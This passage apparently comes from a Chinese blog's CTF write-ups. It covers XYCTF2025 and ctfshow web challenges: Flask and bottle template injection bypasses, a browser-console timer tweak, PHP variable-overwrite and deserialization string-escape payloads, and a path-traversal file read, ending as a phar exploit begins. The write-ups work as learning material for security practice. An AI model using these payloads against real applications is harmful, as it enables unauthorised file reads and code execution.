IsICJqb2luIiwgImRlY29kZSIsIAogICAgImJhdGNoIiwgImZpcnN0IiwgImxhc3QiICwgCiAgICAiICIsImRpY3QiLCJsaXN0IiwiZy4iLAogICAgIm9zIiwgInN1YnByb2Nlc3MiLAogICAgImd8YSIsICJHTE9CQUxTIiwgImxvd2VyIiwgInVwcGVyIiwKICAgICJCVUlMVElOUyIsICJzZWxlY3QiLCAiV0hPQU1JIiwgInBhdGgiLAogICAgIm9zIiwgInBvcGVuIiwgImNhdCIsICJubCIsICJhcHAiLCAic2V0YXR0ciIsICJ0cmFuc2xhdGUiLAogICAgInNvcnQiLCAiYmFzZTY0IiwgImVuY29kZSIsICJcXHUiLCAicG9wIiwgInJlZmVyZXIiLAogICAgIlRoZSBjbG9zZXIgeW91IHNlZSwgdGhlIGxlc3NlciB5b3UgZmluZC4iXSAKICAgICAgICAjIEkgaGF0ZSBhbGwgdGhlc2UuCmFwcCA9IGZsYXNrLkZsYXNrKF9fbmFtZV9fKQpAYXBwLnJvdXRlKCcvJykKZGVmIGluZGV4KCk6CiAgICByZXR1cm4gJ3RyeSAvSDNkZGVuX3JvdXRlJwpAYXBwLnJvdXRlKCcvSDNkZGVuX3JvdXRlJykKZGVmIHIzYWxfaW5zMWRlX3RoMHVnaHQoKToKICAgIGdsb2JhbCBlbmFibGVfaG9vaywgY291bnRlcgogICAgbmFtZSA9IGZsYXNrLnJlcXVlc3QuYXJncy5nZXQoJ015X2luczFkZV93MHIxZCcpCiAgICBpZiBuYW1lOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgbmFtZS5zdGFydHN3aXRoKCJGb2xsb3cteW91ci1oZWFydC0iKToKICAgICAgICAgICAgICAgIGZvciBpIGluIGxvY2tfd2l0aGluOgogICAgICAgICAgICAgICAgICAgIGlmIGkgaW4gbmFtZToKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdOT1BFLicKICAgICAgICAgICAgICAgIGVuYWJsZV9ob29rID0gVHJ1ZQogICAgICAgICAgICAgICAgYSA9IGZsYXNrLnJlbmRlcl90ZW1wbGF0ZV9zdHJpbmcoJ3sjJytmJ3tuYW1lfScrJyN9JykKICAgICAgICAgICAgICAgIGVuYWJsZV9ob29rID0gRmFsc2UKICAgICAgICAgICAgICAgIGNvdW50ZXIgPSAwCiAgICAgICAgICAgICAgICByZXR1cm4gYQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0dXJuICdNeSBpbnNpZGUgd29ybGQgaXMgYWx3YXlzIGhpZGRlbi4nCiAgICAgICAgZXhjZXB0IFJ1bnRpbWVFcnJvciBhcyBlOgogICAgICAgICAgICBjb3VudGVyID0gMAogICAgICAgICAgICByZXR1cm4gJ05PLicKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHJldHVybiAnRXJyb3InCiAgICBlbHNlOgogICAgICAgIHJldHVybiAnV2VsY29tZSB0byBIaWRkZW5fcm91dGUhJwoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGltcG9ydCBvcwogICAgdHJ5OgogICAgICAgIGltcG9ydCBfcG9zaXhzdWJwcm9jZXNzCiAgICAgICAgZGVsIF9wb3NpeHN1YnByb2Nlc3MuZm9ya19leGVjCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgaW1wb3J0IHN1YnByb2Nlc3MKICAgIGRlbCBvcy5wb3BlbgogICAgZGVsIG9zLnN5c3RlbQogICAgZGVsIHN1YnByb2Nlc3MuUG9wZW4KICAgIGRlbCBzdWJwcm9jZXNzLmNhbGwKICAgIGRlbCBzdWJwcm9jZXNzLnJ1bgogICAgZGVsIHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0CiAgICBkZWwgc3VicHJvY2Vzcy5nZXRvdXRwdXQKICAgIGRlbCBzdWJwcm9jZXNzLmNoZWNrX2NhbGwKICAgIGRlbCBzdWJwcm9jZXNzLmdldHN0YXR1c291dHB1dAogICAgZGVsIHN1YnByb2Nlc3MuUElQRQogICAgZGVsIHN1YnByb2Nlc3MuU1RET1VUCiAgICBkZWwgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IKICAgIGRlbCBzdWJwcm9jZXNzLlRpbWVvdXRFeHBpcmVkCiAgICBkZWwgc3VicHJvY2Vzcy5TdWJwcm9jZXNzRXJyb3IKICAgIHN5cy5hZGRhdWRpdGhvb2soYXVkaXRfY2hlY2tlcikKICAgIGFwcC5ydW4oZGVidWc9RmFsc2UsIGhvc3Q9JzAuMC4wLjAnLCBwb3J0PTUwMDApCg=='))                                                                 \nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")                                                                 \nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\n```\n\n然后终端运行了一下\n\n![image-20250405012811767](../image/achieve/202411/XYCTF2025/image-20250405012811767.png)\n\n该说不说，挺神奇的\n\n哎？突然发现上面复制过来的跟在pycharm中看到的不一样，有一堆base64编码的代码\n\n```python\n# YOU FOUND ME ;)\n# -*- encoding: utf-8 -*-\n'''\n@File    :   src.py\n@Time    :   2025/03/29 01:10:37\n@Author  :   LamentXU \n'''\nimport flask\nimport sys\nenable_hook =  False\ncounter = 0\ndef audit_checker(event,args):\n    global counter\n    if enable_hook:\n        if event in [\"exec\", \"compile\"]:\n            counter += 1\n            if counter > 4:\n                raise RuntimeError(event)\n\nlock_within = [\n    \"debug\", \"form\", \"args\", \"values\", \n    \"headers\", \"json\", \"stream\", \"environ\",\n    \"files\", \"method\", \"cookies\", \"application\", \n    'data', 'url' ,'\\'', '\"', \n    \"getattr\", \"_\", \"{{\", \"}}\", \n    \"[\", \"]\", \"\\\\\", \"/\",\"self\", \n    \"lipsum\", \"cycler\", \"joiner\", \"namespace\", \n    \"init\", \"dir\", \"join\", \"decode\", \n    \"batch\", \"first\", \"last\" , \n    \" \",\"dict\",\"list\",\"g.\",\n    \"os\", \"subprocess\",\n    \"g|a\", \"GLOBALS\", \"lower\", \"upper\",\n    \"BUILTINS\", \"select\", \"WHOAMI\", \"path\",\n    \"os\", \"popen\", \"cat\", \"nl\", \"app\", \"setattr\", \"translate\",\n    \"sort\", \"base64\", \"encode\", \"\\\\u\", \"pop\", \"referer\",\n    \"The closer you see, the lesser you find.\"] \n        # I hate all these.\napp = flask.Flask(__name__)\n@app.route('/')\ndef index():\n    return 'try /H3dden_route'\n@app.route('/H3dden_route')\ndef r3al_ins1de_th0ught():\n    global enable_hook, counter\n    name = flask.request.args.get('My_ins1de_w0r1d')\n    if name:\n        try:\n            if name.startswith(\"Follow-your-heart-\"):\n                for i in lock_within:\n                    if i in name:\n                        return 'NOPE.'\n                enable_hook = True\n                a = flask.render_template_string('{#'+f'{name}'+'#}')\n                enable_hook = False\n                counter = 0\n                return a\n            else:\n                return 'My inside world is always hidden.'\n        except RuntimeError as e:\n            counter = 0\n            return 'NO.'\n        except Exception as e:\n            return 'Error'\n    else:\n        return 'Welcome to Hidden_route!'\n\nif __name__ == '__main__':\n    import os\n    try:\n        import _posixsubprocess\n        del _posixsubprocess.fork_exec\n    except:\n        pass\n    import subprocess\n    del os.popen\n    del os.system\n    del subprocess.Popen\n    del subprocess.call\n    del subprocess.run\n    del subprocess.check_output\n    del subprocess.getoutput\n    del subprocess.check_call\n    del subprocess.getstatusoutput\n    del subprocess.PIPE\n    del subprocess.STDOUT\n    del subprocess.CalledProcessError\n    del subprocess.TimeoutExpired\n    del subprocess.SubprocessError\n    sys.addaudithook(audit_checker)\n    app.run(debug=False, host='0.0.0.0', port=5000)\n\n```\n\nMy_ins1de_w0r1d就是我们的注入点，因为这里My_ins1de_w0r1d的值是直接插入的，所以我们直接测试一下\n\n虽然我们的输入被包裹在注释中，但 Jinja2 注释有个特性：注释内的模板语法还是会被解析，只是不输出结果。\n\nMy_ins1de_w0r1d的值需要以Follow-your-heart-开头，因为`{{}}`被过滤了，用`{%print(7*7)%}`\n\n```\n/H3dden_route?My_ins1de_w0r1d=Follow-your-heart-#}{%print(7*7)%}//Follow-your-heart-49\n```\n\n成功触发ssti，我们试一下\n\n```\n/H3dden_route?My_ins1de_w0r1d=Follow-your-heart-#}{%if%09not%09a%}yes{%endif%}//Follow-your-heart-yes\n```\n\n如果没有定义a变量,直接{%if a%}result{%endif%},那么a会被当作false,result不会被执行,那么相反的,使用{%if not a%}result{%endif%},则result可以执行\n\n这里也测出来可以用%09去绕过空格\n\n我测了一晚上没测出来，然后想着还是构造字符吧\n\n```\n{%set%09a=({}|int)**({}|int)%}{%print(a)%}//1\n```\n\n构造成功那就先把数字构造出来\n\n```python\n{%set%09a=(1|int)%}\n{%set%09b=(2|int)%}\n{%set%09c=(3|int)%}\n{%set%09d=(4|int)%}\n{%set%09e=(5|int)%}\n{%set%09f=(6|int)%}\n{%set%09g=(7|int)%}\n{%set%09h=(8|int)%}\n{%set%09i=(9|int)%}\n{%set%09j=(0|int)%}\n{%print(a,b,c,d,e,f,g,h,i,j)%}\n//Follow-your-heart-(1, 2, 3, 4, 5, 6, 7, 8, 9, 0)\n```\n\n如果构造字符型数字的话也是可以的\n\n```\n{%set%09k=(1|string)%}{%print(k)%}//'1'\n```\n\n然后到这就寄了。。。\n\n赛后学习：\n\n### request对象的另一种用法\n\n看的出题师傅的文章：https://www.cnblogs.com/LAMENTXU/articles/18730353\n\n本来是想复现的，但是发现好像复现平台这道题没回显了，只能先看看文章\n\n这题用的是一种比较罕见的技术来打。\n\n我们看看黑名单\n\n```python\nlock_within = [\n    \"debug\", \"form\", \"args\", \"values\", \n    \"headers\", \"json\", \"stream\", \"environ\",\n    \"files\", \"method\", \"cookies\", \"application\", \n    'data', 'url' ,'\\'', '\"', \n    \"getattr\", \"_\", \"{{\", \"}}\", \n    \"[\", \"]\", \"\\\\\", \"/\",\"self\", \n    \"lipsum\", \"cycler\", \"joiner\", \"namespace\", \n    \"init\", \"dir\", \"join\", \"decode\", \n    \"batch\", \"first\", \"last\" , \n    \" \",\"dict\",\"list\",\"g.\",\n    \"os\", \"subprocess\",\n    \"g|a\", \"GLOBALS\", \"lower\", \"upper\",\n    \"BUILTINS\", \"select\", \"WHOAMI\", \"path\",\n    \"os\", \"popen\", \"cat\", \"nl\", \"app\", \"setattr\", \"translate\",\n    \"sort\", \"base64\", \"encode\", \"\\\\u\", \"pop\", \"referer\",\n    \"The closer you see, the lesser you find.\"] \n        # I hate all these.\n```\n\n由于缺少`_`，只能去尝试构造字符`_`，但是由于限制了单双引号和一些重要字符，无法获取到`_`。传统继承链也打不了。\n\n注意到没有过滤request对象（除了request其他的入口类全给你ban了）。然后，可以发现request的常用逃逸参数（args，values这种）全被禁止。同时限死了单双引号，无法拼接，无法进行编码转换。只能去看开发手册找找request还有什么能用的。\n\n![image-20250409114619727](../image/achieve/202411/XYCTF2025/image-20250409114619727.png)\n\n英文看不懂，去简单翻译和咨询一下ai\n\n![image-20250409114853519](../image/achieve/202411/XYCTF2025/image-20250409114853519.png)\n\n可以使用`request.endpoint`获取到当前路由的函数名，我们本地测试一下\n\n\n\n从中，我们能获取字符'd', 'a', 't'\n\n注意到可以拼接出data。进而获取`request.data`，再在请求体中传入任意字符进行绕过。至此，我们可以获得任意字符。\n\n### importlib.reload\n\n在黑名单中去掉了很多可以RCE的函数和方法，python2中可以使用reload函数对类进行重载，在python3中，这个函数搬到了importlib类里。可以以此重载到被删除的方法。\n\n### flask模板注释语句绕过\n\n说实话，我比赛的时候并没有绕过这个，但是页面还是正常回显执行结果了，但在flask里`{#`和`#}`意味着注释语句。即，在这里面的内容不会被渲染，也不会被执行。（不过之前查到是可以执行只是不会输出结果emmm）\n\n所以我们的思路就是：\n\n1.`#}`闭合注释语句\n2.request.endpoint找request.data\n3.request.data从请求体中获取任意字符\n4.通过拼接字符打继承链找到importlib的reload。分别reload`os.popen`和`subprocess.Popen`\n5.通过request打继承链找os打RCE\n\n这道题的质量还是蛮高的，毕竟学到了不少东西，为出题人扛大旗\n\n\n\n## 出题人已疯\n\n附件\n\n```py\n# -*- encoding: utf-8 -*-\n'''\n@File    :   app.py\n@Time    :   2025/03/29 15:52:17\n@Author  :   LamentXU \n'''\nimport bottle\n'''\nflag in /flag\n'''\n@bottle.route('/')\ndef index():\n    return 'Hello, World!'\n@bottle.route('/attack')\ndef attack():\n    payload = bottle.request.query.get('payload')\n    if payload and len(payload) < 25 and 'open' not in payload and '\\\\' not in payload:\n        return bottle.template('hello '+payload)\n    else:\n        bottle.abort(400, 'Invalid payload')\nif __name__ == '__main__':\n    bottle.run(host='0.0.0.0', port=5000)\n```\n\n一眼ssti\n\n![image-20250405121158842](../image/achieve/202411/XYCTF2025/image-20250405121158842.png)\n\n但是这里限制了几个条件\n\n- payload长度要小于25\n- open字符串不能在payload中\n- 斜杠不能在payload中\n\n这里其实限制长度就很难受，最多只能查到当前类就已经打不下去了，看看怎么绕过长度限制吧\n\n\n\n## ez_puzzle\n\n### #前端js\n\ninfernity师傅出的一个拼图游戏\n\n![image-20250405165750865](../image/achieve/202411/XYCTF2025/image-20250405165750865.png)\n\n分析一下源代码\n\n```js\n<script>\n            window.addEventListener(\"contextmenu\", function (ev) { \n                ev.preventDefault();\n                alert(\"你想干嘛？\");\n                return false; \n            }); \n            document.addEventListener(\"keydown\", function (ev) {\n                ev.preventDefault();\n\t\talert(\"你想干嘛？\");\n                return false;\n            });\n</script>\n```\n\n这里的话是对键盘的输入和鼠标右键的操作进行了拦截，逐步解释一下代码吧\n\n1. `window.addEventListener(\"contextmenu\", function (ev) {`\n   - 为全局 window 对象添加一个 \"contextmenu\" 事件监听器（即右键菜单事件）\n   - 当用户右键点击时，会触发后面的回调函数\n2. `ev.preventDefault();`\n   - 阻止右键菜单的默认行为（原本会弹出浏览器默认的右键菜单）\n3. `alert(\"你想干嘛？\");`\n   - 弹出一个警告框，显示\"你想干嘛？\"\n4. `return false;`\n   - 进一步阻止事件冒泡和默认行为\n5. `document.addEventListener(\"keydown\", function (ev) {`\n   - 为 document 对象添加一个 \"keydown\" 事件监听器（即按键按下事件）\n6. `ev.preventDefault();`\n   - 阻止按键的默认行为（比如按空格会向下滚动页面）\n\n然后里面有个js代码，在里面发现了有endTime和startTime两个变量，猜测是会记录开始和结束的时间然后做差算时间，并和2000(毫秒)作比较，这里的endTime是我们不能确定的，但是startTime我们是可以改的，只要最后做差的结果小于2000就行\n\n控制台传入js代码对开始时间进行修改，在控制台传入payload\n\n```\nstartTime = Date.now() - 1900\n```\n\n解释一下payload\n\n1. **`Date.now()`**：\n   - `Date.now()` 是一个 JavaScript 方法，它返回自 Unix 纪元（1970 年 1 月 1 日 00:00:00 UTC）以来的毫秒数。这是一个非常常用的方法，用于获取当前的时间戳。\n2. **`- 1900`**：\n   - 在这个上下文中，`- 1900` 是一个算术操作，它从 `Date.now()` 返回的时间戳中减去 1900 毫秒（即 1.9 秒）。这意味着 `startTime` 的值将代表当前时间减去 1.9 秒的时间戳。\n\n因为这里源码中对键盘和鼠标右键的操作做了禁止并弹窗\n\n所以我们可以双键f12强行打开开发者工具\n\n![image-20250405170453190](../image/achieve/202411/XYCTF2025/image-20250405170453190.png)\n\n此时是停止了的，然后我们在控制台传入\n\n![image-20250405170522648](../image/achieve/202411/XYCTF2025/image-20250405170522648.png)\n\n然后退出开发者工具，把图拼好就可以拿到flag了\n\n![image-20250405170615962](../image/achieve/202411/XYCTF2025/image-20250405170615962.png)\n\n- Infernity师傅的payload\n\n```\nstartTime=100000000\n//把这个变量设置的很大，只要最后相减的结果是小于2000就行\n```\n\n","tags":["XYCTF2025"],"categories":["赛题wp"]},{"title":"ctfshow大吉大利杯(已做完)","url":"/2025/04/08/ctfshow大吉大利杯(已做完)/","content":"\n# veryphp\n\n## #变量解析+正则匹配规则\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"config.php\");\nclass qwq\n{\n    function __wakeup(){\n        die(\"Access Denied!\");\n    }\n    static function oao(){\n        show_source(\"config.php\");\n    }\n}\n$str = file_get_contents(\"php://input\");\nif(preg_match('/\\`|\\_|\\.|%|\\*|\\~|\\^|\\'|\\\"|\\;|\\(|\\)|\\]|g|e|l|i|\\//is',$str)){\n    die(\"I am sorry but you have to leave.\");\n}else{\n    extract($_POST);\n}\nif(isset($shaw_root)){\n    if(preg_match('/^\\-[a-e][^a-zA-Z0-8]<b>(.*)>{4}\\D*?(abc.*?)p(hp)*\\@R(s|r).$/', $shaw_root)&& strlen($shaw_root)===29){\n        echo $hint;\n    }else{\n        echo \"Almost there.\".\"<br>\";\n    }\n}else{\n    echo \"<br>\".\"Input correct parameters\".\"<br>\";\n    die();\n}\nif($ans===$SecretNumber){\n    echo \"<br>\".\"Congratulations!\".\"<br>\";\n    call_user_func($my_ans);\n}\n\nInput correct parameters\n```\n\n先分析一下代码\n\n```php\nif(isset($shaw_root)){\n    if(preg_match('/^\\-[a-e][^a-zA-Z0-8]<b>(.*)>{4}\\D*?(abc.*?)p(hp)*\\@R(s|r).$/', $shaw_root)&& strlen($shaw_root)===29){\n        echo $hint;\n    }else{\n        echo \"Almost there.\".\"<br>\";\n    }\n}else{\n    echo \"<br>\".\"Input correct parameters\".\"<br>\";\n    die();\n}\n```\n\n这里的话页面是返回了Input correct parameters，然后有一个hint变量，可能有提示，所以从这入手\n\n需要满足匹配并且字符长度为29，先分析一下这个正则匹配吧\n\n1. **`/^`**：表示字符串的开始。`^` 确保匹配从字符串的开头开始。\n2. **`\\-`**：匹配字符 `-`（连字符）。因为连字符在正则表达式中有特殊含义，所以需要用反斜杠 `\\` 转义。\n3. **`[a-e]`**：匹配任意一个小写字母，从 `a` 到 `e`。\n4. **`[^a-zA-Z0-8]`**：匹配任意一个不在 `a-z`、`A-Z` 或 `0-8` 范围内的字符。方括号内的 `^` 表示取反。\n5. **`<b>`**：匹配字符串 `<b>`，这是一个 HTML 标签。\n6. **`(.\\*)`**：匹配任意数量的字符（包括零个字符），并将其捕获为第一个组。`.*` 表示零个或多个任意字符。\n7. **`>`**：匹配字符 `>`。\n8. **`{4}`**：表示前面的表达式（即 `>`）必须出现四次。因此，这部分会匹配四个 `>` 字符。\n9. **`\\D\\*?`**：匹配零个或多个非数字字符。`*?` 是一个非贪婪匹配，意味着尽可能少地匹配字符。\n10. **`(abc.\\*?)`**：匹配字母串 `abc`，后面可以跟零个或多个任意字符（非贪婪匹配），并将这一部分捕获为第二组。\n11. **`p(hp)\\*`**：匹配字符 `p`，后面可以跟零个或多个 `hp` 字符串（例如 `p`、`php`、`phphp` 等）。\n12. **`\\@`**：匹配字符 `@`，因为 `@` 本身没有特殊含义，所以不需要转义。\n13. **`R(s|r)`**：匹配字符 `R` 后面跟着 `s` 或 `r`，其中 `(s|r)` 是一个捕获组，表示 `s` 或 `r`。\n14. **`.`**：匹配任意单个字符（除了换行符）。\n15. **`$/`**：表示字符串的结束。`$` 确保匹配到字符串的末尾。\n\n可以自己一个个去匹配，但是要注意贪婪模式，可以先把其他的地方匹配上再回来看贪婪匹配\n\n然后还要关注一段代码\n\n```php\nif(preg_match('/\\`|\\_|\\.|%|\\*|\\~|\\^|\\'|\\\"|\\;|\\(|\\)|\\]|g|e|l|i|\\//is',$str)){\n    die(\"I am sorry but you have to leave.\");\n}else{\n    extract($_POST);\n}\n```\n\n这里的话会对POST传入的数据进行检查，遇到黑名单则会执行die函数，所以这些也是我们要绕过的\n\n在黑名单里面过滤了下划线，但是我们需要传的shaw_root是有下划线的，怎么绕过呢？\n\n想起之前学到的变量解析特性，PHP在将传入的参数转化成有效的变量名的时候，会将某些字符删除或用下划线代替，所以我们这里找找怎么用其他字符去替换下划线，在php解析的时候可以变成下划线这样才能实现变量覆盖的效果\n\n![image-20250408114522003](../image/achieve/202411/大吉大利杯/image-20250408114522003.png)\n\n小数点被过滤了，我们用空格\n\n```\nshaw root=123\n```\n\n![image-20250408114612294](../image/achieve/202411/大吉大利杯/image-20250408114612294.png)\n\n成功实现变量覆盖，接下来就是匹配if语句了\n\n一直传参不成功，我忽略了hackbar对特殊字符的url编码规则了，所以这点得注意，踩坑了！\n\n用bp发包\n\n```\nshaw root=-a9<b>--------->>>>abcphp@Rs2\n```\n\n![image-20250408115906240](../image/achieve/202411/大吉大利杯/image-20250408115906240.png)\n\n获得一段hint\n\n```php\nHere is a hint : \nmd5(\"shaw\".($SecretNumber).\"root\")==166b47a5cb1ca2431a0edfcef200684f && strlen($SecretNumber)===5\n```\n\n然后我们结合题目中最后的代码\n\n```php\nif($ans===$SecretNumber){\n    echo \"<br>\".\"Congratulations!\".\"<br>\";\n    call_user_func($my_ans);\n}\n```\n\n其实我觉得这里没啥影响，只需要把SecretNumber的值爆出来就行，其实可以通过变量覆盖来覆盖掉`$SecretNumber`的值，但是字母e被过滤掉了，所以只能写脚本进行爆破\n\n```php\n<?php\nfor($i =0;$i<=99999;$i++){\n    if(md5(\"shaw\".($i).\"root\")==\"166b47a5cb1ca2431a0edfcef200684f\" && strlen($i)===5){\n        echo $i;\n    }\n}\n//21475\n```\n\n但是我们是向ans传值而不是SecretNumber\n\n然后我们就得利用最后的类了\n\n```php\nclass qwq\n{\n    function __wakeup(){\n        die(\"Access Denied!\");\n    }\n    static function oao(){\n        show_source(\"config.php\");\n    }\n}\n```\n\n没啥好说的，这里直接调用qwq类中的oao，所以最后的payload就是\n\n```\nshaw root=-a9<b>--------->>>>abcphp@Rs2&ans=21475&my ans=qwq::oao\n```\n\n# spaceman\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nclass spaceman\n{\n    public $username;\n    public $password;\n    public function __construct($username,$password)\n    {\n        $this->username = $username;\n        $this->password = $password;\n    }\n    public function __wakeup()\n    {\n        if($this->password==='ctfshowvip')\n        {\n            include(\"flag.php\");\n            echo $flag;    \n        }\n        else\n        {\n            echo 'wrong password';\n        }\n    }\n}\nfunction filter($string){\n    return str_replace('ctfshowup','ctfshow',$string);\n}\n$str = file_get_contents(\"php://input\");\nif(preg_match('/\\_|\\.|\\]|\\[/is',$str)){            \n    die(\"I am sorry but you have to leave.\");\n}else{\n    extract($_POST);\n}\n$ser = filter(serialize(new spaceman($user_name,$pass_word)));\n$test = unserialize($ser);\n?> wrong password\n```\n\n这里的话有有多变少的字符替换，第一个想的就是字符串逃逸，但是这里的序列化和反序列化的操作并不指向一个可控的变量，而我们需要对username和password进行赋值操作，所以需要绕过正则匹配去传入正确的值\n\n在`__wakeup()`魔术方法中有flag变量的输出，但是需要让password为ctfshowvip\n\n## 非预期\n\n### #变量覆盖\n\n其实这里的话可以实现变量覆盖，是可以直接非预期赋值去做的\n\n```\nuser[name=1&pass[word=ctfshowvip\n```\n\n 和上题一样，利用解析变量的特性去实现变量覆盖，但是我们还是要看一下预期解的\n\n## 预期解\n\n### #字符串逃逸\n\n先在本地测试，随便传两个进行序列化操作\n\n```php\n<?php\nclass spaceman\n{\n    public $username=\"admin\";\n    public $password=\"ctfshowvip\";\n\n}\n$a = new spaceman();\necho serialize($a);\n#O:8:\"spaceman\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:10:\"ctfshowvip\";}\n```\n\n因为是字符减少的绕过，会往后吞掉字符，那么我们需要构造的序列化字符串是\n\n```php\n<?php\nclass spaceman\n{\n    public $username=\"admin\";\n    public $password='1\";s:8:\"password\";s:10:\"ctfshowvip\";}';\n\n}\n$a = new spaceman();\necho serialize($a);\n//O:8:\"spaceman\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:37:\"1\";s:8:\"password\";s:10:\"ctfshowvip\";}\";}\n```\n\n需要吞掉的字符是\n\n```\n\";s:8:\"password\";s:37:\"1//24个字符\n```\n\nctfshowup->ctfshow，一次吞掉两个字符，所以需要传入12个ctfshowup最终的exp就是\n\n```php\n<?php\n//O:8:\"spaceman\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:37:\"1\";s:8:\"password\";s:10:\"ctfshowvip\";}\";}\n\n//需要逃逸的字符串\n//$a = '\";s:8:\"password\";s:37:\"1';\n//echo strlen($a);#24个\n\n//payload\nclass spaceman\n{\n    public $username=\"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup\";\n    public $password='1\";s:8:\"password\";s:10:\"ctfshowvip\";}';\n}\n$a = serialize(new spaceman());\n//echo $a;\n#O:8:\"spaceman\":2:{s:8:\"username\";s:108:\"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup\";s:8:\"password\";s:37:\"1\";s:8:\"password\";s:10:\"ctfshowvip\";}\";}\n//替换后的序列化字符串\nfunction filter($string)\n{\n    return str_replace('ctfshowup','ctfshow',$string);\n}\n$b = filter($a);\necho $b;\n#O:8:\"spaceman\":2:{s:8:\"username\";s:108:\"ctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshowctfshow\";s:8:\"password\";s:37:\"1\";s:8:\"password\";s:10:\"ctfshowvip\";}\";}\n#O:8:\"spaceman\":2:{s:8:\"username\";s:108:\"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup\";s:8:\"password\";s:37:\"1\";s:8:\"password\";s:10:\"ctfshowvip\";}\";}\n```\n\n所以最后的payload是\n\n```\nuser[name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&pass[word=1\";s:8:\"password\";s:10:\"ctfshowvip\";}\n```\n\n# 虎山行\n\n## #代码审计+phar反序列化+条件竞争\n\n源码中有/install.php\n\n![image-20250410145836545](../image/achieve/202411/大吉大利杯/image-20250410145836545.png)\n\n点开始安装然后登录网站后台\n\n![image-20250410150011317](../image/achieve/202411/大吉大利杯/image-20250410150011317.png)\n\n有个写文章的口子还有一个文件上传的口子，先测一下文件上传的,发现这个口子对文件内容没有检查，但是限制了文件后缀，而且是白名单，测了很久没绕过去，换个方向\n\n扫描目录后翻看一下发现有\n\n```\n[15:16:57] Scanning:\n[15:17:58] 200 -    1KB - /CgiStart?page=Single\n[15:18:47] 200 -    1KB - /README.md\n[15:19:04] 301 -   169B - /upload  ->  http://3bbe7f69-7eaf-40eb-9402-246fbb743c48.challenge.ctf.show/upload/\n[15:19:04] 200 -   324B - /upload.php\n[15:19:04] 200 -     0B - /upload/\n[15:19:12] 200 -   48KB - /www.rar\n```\n\n访问一下/www.rar把源码下载下来，这里upload.php证明我们的方向是没错的\n\n源码目录\n\n![image-20250410152156863](../image/achieve/202411/大吉大利杯/image-20250410152156863.png)\n\n有点多啊，看看能不能丢给seay进行代码审计分析一下\n\n![image-20250410152532017](../image/achieve/202411/大吉大利杯/image-20250410152532017.png)\n\n有三十三个地方，我们挨个看下\n\n最后锁定在/mc-admin/page-edit.php下的一处任意文件读取\n\n```php\n} else if (isset($_GET['file'])) {\n  $file_path = '../mc-files/pages/data/'.$_GET['file'];\n  \n  $data = (file_get_contents($file_path));\n```\n\n这里甚至没有后缀名的限制，可以实现任意文件读取，根据代码中的目录，得进行目录穿越\n\n```\n/mc-admin/page-edit.php?file=../../../../../../flag\n```\n\n![image-20250410154415077](../image/achieve/202411/大吉大利杯/image-20250410154415077.png)\n\n让我们访问ctfshowsecretfilehh目录的index.php文件\n\n```\n/mc-admin/page-edit.php?file=../../../../../../var/www/html/ctfshowsecretfilehh/index.php\n```\n\n源码里有\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude('waf.php');\nclass Ctfshow{\n    public $ctfer = 'shower';\n    public function __destruct(){\n        system('cp /hint* /var/www/html/hint.txt');\n    }\n}\n$filename = $_GET['file'];\nreadgzfile(waf($filename));\n?>\n```\n\n再看一下waf.php\n\n```php\n//waf.php\nfunction waf($file){\n    if (preg_match(\"/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\\.\\.\\//i\",$file)){\n        die(\"姿势太简单啦，来一点骚的？！\");\n    }else{\n        return $file;\n    }\n}\n```\n\n要触发`__destruct`方法，看到readgzfile函数，第一个想到的是phar反序列化，但是这里的waf好像不可知\n\n结合之前的文件上传的口子，那里应该就是上传的地方,那就先写个exp吧\n\n```php\n<?php\nclass 